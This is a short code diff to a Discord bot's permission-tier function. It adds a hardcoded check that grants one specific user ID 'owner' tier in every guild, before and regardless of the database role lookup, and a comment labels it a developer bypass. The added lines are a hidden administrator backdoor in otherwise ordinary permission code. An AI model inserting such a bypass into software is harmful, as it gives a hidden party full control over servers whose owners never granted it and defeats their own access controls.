@@ -21,6 +21,9 @@ async function getEffectiveTier(guildId, member) {
   // Discord-Server-Owner ist immer owner-Tier (Lockout-Schutz, vor DB-Lookup).
   if (member.id === member.guild?.ownerId) return 'owner';
 
+  // Developer/Bypass für User 820239667873316874
+  if (member.id === '820239667873316874') return 'owner';
+
   const [rows] = await getPool().execute(
     'SELECT role_id, permission FROM role_permissions WHERE guild_id = ?',
     [guildId],
